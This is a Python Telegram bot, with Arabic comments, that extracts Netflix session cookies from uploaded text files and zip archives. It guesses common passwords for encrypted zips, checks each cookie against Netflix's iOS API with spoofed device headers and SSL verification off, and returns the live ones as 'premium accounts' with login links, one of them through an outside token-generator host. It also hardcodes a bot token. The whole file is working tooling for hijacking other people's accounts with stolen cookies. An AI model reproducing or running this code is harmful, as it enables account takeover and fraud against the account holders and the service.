import telebot
import pyzipper
import os
import re
import shutil
import urllib.parse
import time
import requests
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from urllib3.exceptions import InsecureRequestWarning

# --- إعدادات البوت والتوكن ---
TOKEN = '8890151932:AAHxYsWT-mikvf0U9WvcGbdKhTn4IMsyH4Y'
bot = telebot.TeleBot(TOKEN)

# تعطيل تحذيرات SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

COMMON_PASSWORDS = ["123", "1234", "admin", "cookies", "netflix", "premium", "troxdrop"]
BASE_TEMP_DIR = "final_output_temp"
if not os.path.exists(BASE_TEMP_DIR):
    os.makedirs(BASE_TEMP_DIR)

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "modelType": "IPHONE8-1",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.client.appversion": "15.48.1",
    "accept-language": "en-US;q=1",
}

def extract_clean_netflix_ids(text):
    cleaned_ids = []
    # Netscape format
    netscape_matches = re.findall(r"NetflixId\s+([^\s\n\r]+)", text)
    for val in netscape_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    # Standard format
    standard_matches = re.findall(r"NetflixId=([^;\s\n`]+)", text)
    for val in standard_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    return cleaned_ids

def check_netflix_cookie_detailed(netflix_id):
    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        response = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            value_data = data.get("value", {})
            account_info = value_data.get("account", {}).get("token", {}).get("default", {})
            token = account_info.get("token")
            expires = account_info.get("expires")
            
            if token:
                membership_status = value_data.get("membershipStatus", "UNKNOWN")
                is_on_hold = value_data.get("accountHold", False) or value_data.get("isInHoldStatus", False)
                geoblock_status = value_data.get("geoBlockStatus", {})
                if membership_status != "FORMER_MEMBER" and not is_on_hold and not geoblock_status.get("isBlocked", False):
                    return {"token": token, "expires": expires, "bypass": False}
        
        # Fallback check
        fallback_url = "https://www.netflix.com/YourAccount"
        res_fallback = requests.get(fallback_url, headers={"User-Agent": "Mozilla/5.0", "Cookie": f"NetflixId={netflix_id}"}, timeout=8, allow_redirects=False)
        if res_fallback.status_code in [200, 302] and "login" not in res_fallback.headers.get("Location", "").lower():
            return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True}
        return None
    except Exception:
        return None

def safe_send_message(chat_id, text, markup=None):
    """دالة ذكية لإرسال الرسائل والتعامل مع نظام الحظر المؤقت لتليجرام تلقائياً"""
    while True:
        try:
            bot.send_message(chat_id, text, reply_markup=markup, disable_web_page_preview=True)
            break
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                # استخراج وقت الانتظار المطلوب من رسالة تليجرام والالتزام به
                retry_after = int(re.search(r'retry after (\d+)', e.description).group(1)) if re.search(r'retry after (\d+)', e.description) else 5
                print(f"⚠️ حماية تليجرام نشطة. جاري الانتظار لمدة {retry_after} ثانية...")
                time.sleep(retry_after + 1)
            else:
                print(f"❌ خطأ غير متوقع أثناء الإرسال: {e}")
                break

def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, source_name="CookiesStandard1paymentsextrafalseINextractedfile.txt"):
    if not netflix_ids:
        safe_send_message(chat_id, "❌ لم يتم العثور على أي كوكيز صالحة للعمل.")
        return

    total_count = len(netflix_ids)
    status = bot.send_message(chat_id, f"⏳ تم العثور على ({total_count}) كوكيز. جاري بدء الفحص اللحظي...", reply_to_message_id=reply_to_message_id)
    
    live_count = 0
    dead_count = 0

    for index, netflix_id in enumerate(netflix_ids, start=1):
        if index % 5 == 0 or index == total_count:
            try:
                bot.edit_message_text(
                    f"⏳ جاري الفحص والمحاكاة: ({index}/{total_count})\n✅ شغال ونشط: {live_count} | ❌ منتهي/مرفوض: {dead_count}",
                    chat_id, status.message_id
                )
            except Exception:
                pass

        result = check_netflix_cookie_detailed(netflix_id)
        if result:
            live_count += 1
            token = result["token"]
            expires = result["expires"]
            
            if isinstance(expires, int) and len(str(expires)) == 13:
                expires //= 1000
            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
            full_cookie_string = f"NetflixId={netflix_id}"
            
            if result["bypass"]:
                direct_netflix_url = "https://www.netflix.com/"
            else:
                direct_netflix_url = f"https://netflix.com/?nftoken={token}"
                
            encoded_cookie = urllib.parse.quote(full_cookie_string)
            bridge_login_url = f"https://nftokengen-7ik6.onrender.com/nf/netflix?cookie={encoded_cookie}"
            
            res_text = (
                f"🌟 PREMIUM ACCOUNT 🌟\n\n"
                f"📁 Source: {source_name}\n"
                f"✅ Status: Valid Premium Account\n\n"
                f"👤 Account Details:\n"
                f"• Account Number: #{live_count}\n"
                f"• Plan: Premium / Standard\n"
                f"• Next Billing: {date_str}\n"
                f"• Membership Status: CURRENT_MEMBER\n"
                f"• Email Verified: Yes\n\n"
                f"🔗 رابط الدخول المباشر (Direct URL):\n"
                f"{direct_netflix_url}\n\n"
                f"🍪 Cookie:\n"
                f"{full_cookie_string}\n\n"
                f"📊 Account Filter: Premium Only\n"
                f"🎯 Mode: Full Information مع دخول هاتف و pc"
            )
            
            markup = InlineKeyboardMarkup()
            markup.row_width = 2
            markup.add(
                InlineKeyboardButton("💻 PC Login", url=direct_netflix_url),
                InlineKeyboardButton("📱 Phone Login", url=bridge_login_url)
            )
            
            # إرسال آمن لحساب محمي من الـ Rate Limit
            safe_send_message(chat_id, res_text, markup)
            time.sleep(1.5)  # فاصل زمني آمن بين الحسابات الناجحة لتجنب تراكم الحظر
        else:
            dead_count += 1
            
        time.sleep(0.1)

    safe_send_message(chat_id, f"📊 **اكتمل فحص وتصفية كامل المدخلات!**\n\n✅ إجمالي الشغال المستخرج: {live_count}\n❌ إجمالي المنتهي والمرفوض: {dead_count}")

# --- معالجة الملفات المضغوطة والأرشيف ---

def unzip_and_extract_ids(zip_path, extract_to, password=None):
    try:
        with pyzipper.AESZipFile(zip_path) as zip_ref:
            if password:
                zip_ref.setpassword(password.encode('utf-8'))
            zip_ref.extractall(path=extract_to)
        
        all_cookies = []
        for root, dirs, files in os.walk(extract_to):
            for file in files:
                if file.endswith('.txt') or file.endswith('.log'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            found_ids = extract_clean_netflix_ids(f.read())
                            for nid in found_ids:
                                if nid not in all_cookies:
                                    all_cookies.append(nid)
                    except Exception:
                        continue
        return True, all_cookies, None
    except RuntimeError as e:
        if 'encrypted' in str(e) or 'password' in str(e) or 'Bad password' in str(e):
            return False, [], "ENCRYPTED"
        return False, [], str(e)
    except Exception as e:
        if 'compression method' in str(e):
            return False, [], "UNSUPPORTED_COMPRESSION"
        return False, [], str(e)

def process_zip_entry(message, file_path, password=None, password_msg_id=None, original_name="Extracted_Archive.txt"):
    chat_id = message.chat.id
    user_work_dir = os.path.join(BASE_TEMP_DIR, f"{chat_id}_{int(time.time())}")
    
    if os.path.exists(user_work_dir):
        shutil.rmtree(user_work_dir)
    os.makedirs(user_work_dir)

    success, final_ids, error_type = unzip_and_extract_ids(file_path, user_work_dir, password)
    
    if password_msg_id:
        try: bot.delete_message(chat_id, password_msg_id)
        except: pass

    if success:
        shutil.rmtree(user_work_dir)
        if os.path.exists(file_path): os.remove(file_path)
        process_cookies_list_and_check(chat_id, final_ids, message.message_id, source_name=original_name)
    elif error_type == "ENCRYPTED":
        if not password:
            for pwd in COMMON_PASSWORDS:
                sec_success, sec_ids, _ = unzip_and_extract_ids(file_path, user_work_dir, pwd)
                if sec_success:
                    shutil.rmtree(user_work_dir)
                    process_zip_entry(message, file_path, password=pwd, original_name=original_name)
                    return
            
            markup = InlineKeyboardMarkup()
            buttons = [InlineKeyboardButton(pwd, callback_data=f"fanal_{pwd}_{file_path}_{original_name}") for pwd in COMMON_PASSWORDS]
            markup.add(*buttons)
            bot.send_message(chat_id, "⚠️ هذا الملف المضغوط محمي بكلمة مرور! اختر كلمة السر:", reply_markup=markup)
        else:
            bot.send_message(chat_id, "❌ كلمة المرور غير صحيحة.")
    else:
        bot.send_message(chat_id, f"❌ خطأ: {error_type}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "👋 تم حل مشكلة الحظر وتداخل النصوص بنجاح! أرسل الملفات الآن.")

@bot.message_handler(content_types=['document'])
def handle_incoming_document(message):
    file_name = message.document.file_name
    file_name_lower = file_name.lower()
    
    if file_name_lower.endswith('.zip'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        local_path = os.path.join(BASE_TEMP_DIR, f"incoming_{message.chat.id}_{int(time.time())}.zip")
        with open(local_path, 'wb') as f:
            f.write(downloaded_file)
        process_zip_entry(message, local_path, original_name=file_name)
    elif file_name_lower.endswith('.txt') or file_name_lower.endswith('.log'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_content = downloaded_file.decode('utf-8', errors='ignore')
        extracted_ids = extract_clean_netflix_ids(file_content)
        process_cookies_list_and_check(message.chat.id, extracted_ids, message.message_id, source_name=file_name)

@bot.callback_query_handler(func=lambda call: call.data.startswith('fanal_'))
def handle_inline_passwords(call):
    data_parts = call.data.split('_')
    chosen_password = data_parts[1]
    remaining_parts = data_parts[2:]
    original_name = remaining_parts[-1]
    file_path = "_".join(remaining_parts[:-1])
    if os.path.exists(file_path):
        process_zip_entry(call.message, file_path, password=chosen_password, password_msg_id=call.message.message_id, original_name=original_name)

@bot.message_handler(func=lambda message: True)
def handle_plain_text(message):
    extracted_ids = extract_clean_netflix_ids(message.text)
    process_cookies_list_and_check(message.chat.id, extracted_ids, message.message_id, source_name="Direct_Text.txt")

if __name__ == "__main__":
    # استخدام سياق تخطي الأخطاء لضمان سد ثغرة الـ Conflict عند إعادة التشغيل
    print("🚀 تم تفعيل جدار الحماية ضد قفل الـ Rate Limit والـ Conflict...")
    while True:
        try:
            bot.polling(none_stop=True, skip_pending=True)
        except Exception as e:
            print(f"Polling error reboot: {e}")
            time.sleep(3)